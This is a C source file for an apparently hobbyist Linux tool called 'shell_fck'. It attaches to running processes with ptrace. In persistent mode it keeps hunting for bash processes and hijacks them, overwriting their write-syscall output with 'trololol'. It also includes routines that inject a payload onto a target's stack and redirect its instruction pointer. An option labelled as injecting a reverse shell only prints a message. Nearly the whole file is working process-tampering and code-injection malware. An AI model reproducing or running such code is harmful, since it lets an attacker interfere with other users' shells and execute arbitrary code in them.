#include "shell_fck.h"

/* usage function */
void usage()
{
	printf("Example Uses\n[1] ./shell_fck -p <pid_to_attach>\n[2] ./shell_fck -n <name_of_process> (ie sh, zsh, bash...)\n[3] ./shell_fck -l (list running processes)\n");
}

int main(int argc, char **argv)
{
	pid_t pid;
	char *process_name;
	
	/* use for friendly options parsing */	
	struct option long_options[] = 
	{
		{"pid", required_argument, 0, 'p'},
		{"process_name", required_argument, 0, 'n'},
		{"List_processes", no_argument, 0 , 'l'},
		{"inject_code", no_argument, 0, 'i'},
		{"persistent mode", no_argument, 0, 'P'},
		{"help", no_argument, 0, 'h'}
	};

	int option;
	int long_index = 0;
	char *value;
	while((option = getopt_long(argc, argv, "p:n:lhiP", long_options, &long_index)) != -1)
	{
		switch(option)
		{
			case 'p':
				pid = atoi(optarg);
				pthread_t thread_id;
				struct pid_struct *proc = (struct pid_struct *) malloc(sizeof(pid_struct));

				proc->pid = pid;
				memset(proc->proc_name, 0, sizeof(proc->proc_name));
				proc->is_child = false;
				proc->next = NULL;

				/* Create a new thread to handle messing with the process */
				if(pthread_create(&thread_id, NULL, init_thread, proc))
				{
					printf("[!] Error creating thread [!]\n");
					return 1;
				} 
				proc->being_traced = true;
				pthread_join(thread_id, NULL); //wait for the thread to finish
				break;
			case 'n':
				process_name = optarg;
				struct pid_struct *current_pids = find_process(process_name, 0);
				free(current_pids);
				break;
			case 'l':
				find_process("ALL", 0);
				break;
			case 'i':
				printf("[+] Injecting reverse shell into process [+]\n");
				break;
			case 'P':
				printf("[+] going persistent [+]\n");
				persist();
				break;
			case 'h':
				usage();
				break;
		}
	}

}

void persist()
{
	/* Initialise hash table */
	struct pid_hash_table *my_table = (struct pid_hash_table *)malloc(sizeof(pid_hash_table));
	my_table->size = 100;

	/* Allocate hashtable buckets */
	my_table->table = malloc(sizeof(struct pid_struct*) * my_table->size);

	pthread_t thread_id;

	/* Null out the buckets */
	for(int i = 0; i < my_table->size; i++)
		my_table->table[i] = NULL;
	
	unsigned int timer = 0;

	while(true)
	{
		if(timer == 10) //clear the hash table every 5 minutes
		{
			printf("CLEARING\n");
			clear_table(my_table);
			timer = 0;
		}
		
		struct pid_struct *proc_list = find_process("ALL", my_table);
			
		/* proc_list == NULL when no bash processes running */
		if(proc_list != NULL)
			update_hash_table(proc_list, my_table);
			
		/* Iterate over the hashtable and decide which processes to attach to */
		for(int i = 0; i < my_table->size; i++)
		{
			struct pid_struct *proc = my_table->table[i];

			/* Iterate over the entries in that position of the hashtable */
			while(proc != NULL)
			{
				/* We can use the proc_name field to decide what processes to attach to */
				if(strcmp(proc->proc_name, "bash") == 0 && proc->is_alive && !proc->being_traced)
				{
					/* If the thread is successfully created */
					if(pthread_create(&thread_id, NULL, init_thread, proc) == 0)
						proc->being_traced = true; //mark this process as being traced
				}
						
				proc = proc->next;
			}
				
		}

		//Debug (Print the state of the hash table)
		for(int i = 0; i < my_table->size; i++)
		{
			if(my_table->table[i] != NULL)
			{


				struct pid_struct *x = my_table->table[i];
				while(x != NULL)
				{
					printf("[%d:%d]%s -> ",i,x->pid, x->proc_name);
					x = x->next;
					if(x == NULL)
						printf("\n");
				}
			}
		}
			
		printf("SLEEP\n");
		/* Sleep to save system resources */
		sleep(30);
		timer++;
	}
}
	
void *init_thread(void *args)
{
	struct pid_struct *proc = (struct pid_struct *)args;

	printf("[+] Attempting to attach to pid: %d [+]\n", proc->pid);
	
	/* Ensure we actually attach to the process */
	if(ptrace(PTRACE_ATTACH, proc->pid, NULL, NULL) != 0)
	{
		printf("[!] Error attaching to process %d [!]\n", proc->pid);
		proc->being_traced = false;
		return NULL;
	}

	printf("[+] Calling trace child on pid: %d\n", proc->pid);
	trace_child(proc);
}

void trace_child(struct pid_struct *proc)
{
	int status = 0, syscall, retval;
	struct user_regs_struct registers;

	/* These flags are needed to determine syscalls from systraps, and to trace clones */
	long flags = PTRACE_O_TRACESYSGOOD | PTRACE_O_TRACECLONE | PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK;

	ptrace(PTRACE_SETOPTIONS, proc->pid, 0, flags); //set ptrace options, so we can get syscalls//	
	printf("[+] Tracing pid: %d\n", proc->pid);

	while(true)
	{
		/* Wait for the first sigtrap when a syscall is hit */
		if(syscall_seen(proc) != SYSCALL_SEEN) break;


		ptrace(PTRACE_GETREGS, proc->pid, NULL, &registers);
		//printf("[pid: %d] System(%d)\n", pid, registers.orig_rax); //Need to map syscalls numbers to names

		/* If the sys_write is called from the child process, and not a grandchild */
		if(registers.orig_rax == 0 && proc->is_child)//1 = sys_read
		{
			/* For some reason when attaching to /bin/bash, we get stuck on read(3, "", 1)
			 * Setting the registers to 0 fixes this
			 * This needs to be handled better, the is_child boolean is a pretty shit fix
			 * TODO: Find some way of tracing the grandchild, ie by checking the pid.
			*/
			if(registers.rdx == 1)//for some reason it tries to read 1 byte
			{
				//registers.rdi = 3;
				registers.rdx = 0;
				ptrace(PTRACE_SETREGS, proc->pid, 0, &registers); //read(3, "", 0)
			}
		}
		/* Again, this is a pretty crap fix, maybe use a if(pid == grand_child_pid) */
		if(registers.orig_rax == 1 && proc->is_child) //sys_write
		{
			ptrace(PTRACE_GETREGS, proc->pid, 0, &registers);
			get_data(proc->pid, registers.rsi, &registers); //lets fuck stuff up
		}
		
		/* Grab the return from a syscall */
		if(syscall_seen(proc) != SYSCALL_SEEN) break;
		
		/* We can use the retval to match up calls -> returns */
		retval = ptrace(PTRACE_PEEKUSER, proc->pid, sizeof(long)*RAX, NULL);

		//printf("[pid: %d] System(%d) COMPLETE\n", pid, retval);
	}
}

int syscall_seen(struct pid_struct *proc)
{
	int status = 0;
	
	/* Here we loop until we either see a syscall or a new child process is created */
	while(true)
	{
		/* Tell the child to continue until the next syscall */
		ptrace(PTRACE_SYSCALL, proc->pid, 0,0);

		waitpid(proc->pid, &status, 0); //wait for something to happen
		
		/* We want to see if the process has been trapped */
		if(WSTOPSIG(status) == SIGTRAP && WIFSTOPPED(status))
		{
			/* If the child has created a new child, we trace that until it exits.  defined in man(ptrace)*/
			if(new_child(status))
			{
				pid_t pid_child;

				/* Get the pid of the new child */
				ptrace(PTRACE_GETEVENTMSG, proc->pid, 0, &pid_child);

				struct pid_struct *child_proc = create_pid_struct(pid_child, proc->proc_name, true, NULL);
				
				printf("[!] Process is spawning a new child. pid: %d\n", child_proc->pid);
				trace_child(child_proc);
				
				return SYSCALL_SEEN; //return control to trace_child()
			}
		}
		if(WSTOPSIG(status) & 0x80 && WIFSTOPPED(status))
		{
			return SYSCALL_SEEN;
		}

		/* Child exited */
		if(WIFEXITED(status))
		{
			if(proc->is_child) 
				free(proc);
			else 
			{
				proc->is_alive = false;
				proc->being_traced = false; //this child is ready to be removed from the hashtable
			}
			
			printf("Child exiting...\n");
			
			return 1;
		}
	}
}

void get_data(pid_t pid, unsigned long addr, struct user_regs_struct *regs)
{
	/* Allocate memory for storing data */
	char *val = malloc(8096);
	memset(val, 8096, 0);
	int index = 0;
	unsigned long tmp;

	/* allocate stuff for messing with the data */
	char str[] = "trololol";
	long payload;
	
	while(index < 8096)
	{
		/* get the data at addr[index] */
		tmp = ptrace(PTRACE_PEEKDATA, pid, addr+index);

		/* store the data at that address in val */
		memcpy(val+index, &tmp, sizeof(long));

		/* This is how we mess with the ouput */
		memcpy(&payload, str, sizeof(str));
		ptrace(PTRACE_POKEDATA, pid, regs->rsi+index, payload);
		
		
		if (memchr(&tmp, 0, sizeof(tmp)) != NULL)
            		break;
		
        
		index += sizeof(long);

	}
	
	free(val);

}

bool new_child(int status)
{
	/* This is defined in the manpage for ptrace, we need to look for all events of a clone otherwise we may miss some */
	return (status >> 8 == (SIGTRAP | (PTRACE_EVENT_CLONE << 8))) || (status >> 8) == (SIGTRAP | (PTRACE_EVENT_FORK << 8))  || (status >> 8) == (SIGTRAP | (PTRACE_EVENT_VFORK << 8));
}

struct pid_struct* find_process(char *needle, struct pid_hash_table *current_table)
{
	char filename[256]; //buffer for filename

	/* Bit of linked list setup */
	struct pid_struct *root = (struct pid_struct *) malloc(sizeof(pid_struct));

	/* If we couldn't malloc a proc_list */
	if(root == NULL)
		return NULL;

	struct pid_struct *p = root;

	bool found = false;

	struct dirent *p_dirent;
	DIR *dir;
	char program_buffer[50]; //buffer to hold program name associate with pid

	memset(filename, 0, sizeof(filename));

	if((dir = opendir("/proc/")) == NULL)
	{
		printf("[!] Could not open directory [!]\n");
		return NULL;
	}

	/* iterate past the first few entries of the process directory */
	while((p_dirent = readdir(dir)) != NULL)
	{
		if(strcmp(p_dirent->d_name, "1") == 0) //we want to find the first process
			break;
	}

	/* read the status files of the processes until we get a shell process */
	while((p_dirent = readdir(dir)) != NULL)
	{
		/* set the filename up ready to open the status file */
		strcpy(filename, "/proc/");
		strcat(filename, p_dirent->d_name);
		strcat(filename, "/status");

		bool got_name = get_name_field(filename, program_buffer);
	
		pid_t pid = atoi(p_dirent->d_name); //grab the pid 

		if(strcmp(needle, "ALL") == 0 && got_name)
		{
			
			/* create a new pid struct with the details we have found */
			memset(p->proc_name, 0, sizeof(p->proc_name));
			p->pid = pid;
			p->is_child = false;
			p->is_alive = true;
			p->being_traced = false;
			strncpy(p->proc_name, program_buffer, sizeof(p->proc_name));

			if(current_table != NULL && !in_table(pid, current_table))
			{	
				p->next = (struct pid_struct *) malloc(sizeof(pid_struct));
				found = true;
				printf("[+] Found %s process pid: %d [+]\n", p->proc_name, p->pid);
				p = p->next;
			}
		}
		else if(strncmp(program_buffer, needle, sizeof(needle)) == 0)
		{				
			/*add that pid to the pid_struct, typical linked list */
			memset(p->proc_name, 0, sizeof(p->proc_name));
			p->pid = pid;
			p->is_child = false;
			p->is_alive = true;
			p->being_traced = false;
			strncpy(p->proc_name, program_buffer, sizeof(p->proc_name));
			
			if(current_table != NULL && !in_table(pid, current_table))
			{	
				p->next = (struct pid_struct *) malloc(sizeof(pid_struct));
				printf("[+] Found %s process pid: %s [+]\n", needle, p_dirent->d_name);
				found = true;
				p = p->next;
			}
		}
		
		memset(filename, 0, sizeof(filename)); //reset filename
	}
	closedir(dir);

	/* We need to differentiate between finding a process list and not */
	if(!found)
	{
		free(root);
		return NULL;
	}
	else
	{
		free(p); //free the malloced next pointer
		return root;
	}
	
}

/* We want to get the name associated with the pid */
bool get_name_field(char *filename, char *buff)
{
	FILE *fp;
	
	memset(buff, 0, sizeof(buff));
	

	if((fp = fopen(filename, "r")) == NULL)
	{
		return false;
	}

	fseek(fp, 6, SEEK_CUR); //seek past the "Name:\t" field

	fgets(buff, 40, fp); //grab the name, 40 bytes is more than enough
	fclose(fp);
	
	int i = 0;
	while(buff[++i] != '\n'); //handle the trailing new line

	buff[i] = '\00';

	return true;
}

int pwn(void *payload, pid_t pid, struct user_regs_struct registers)
{
	/* Get the current address of the stack */
	long stack = registers.rsp;
	long payload_addr = stack-1024;

	/* Get the current instruction pointer, might save this for later */
	long rip = registers.rip;

	/* We may need to mmap an executable area of memory ?? */
	/* Or patch the binary on the fly by pushing our data into RIP */

	/* Inject payload into that address */
	inject_code(pid, payload_addr, sizeof(payload), payload);

	/* Set RIP to point to our payload on the stack */
	registers.rip = payload_addr;
	ptrace(PTRACE_SETREGS, pid, 0, &registers);


	return 0;
}

/* inject the payload of length size at address addr in proc pid */
int inject_code(pid_t pid, long addr, int size, void *payload)
{
	int i = 0;
	unsigned long curr_payload;
	long tmp_addr;

	while(i < size)
	{
		/* copy 8 bytes of the payload */
		memcpy(&curr_payload, payload, sizeof(long));

		/* Move those 8 bytes into the address we have calculated */
		ptrace(PTRACE_POKETEXT, pid, addr, curr_payload);
		i += sizeof(long);
		payload += sizeof(long);

	}
	
	return 0;
}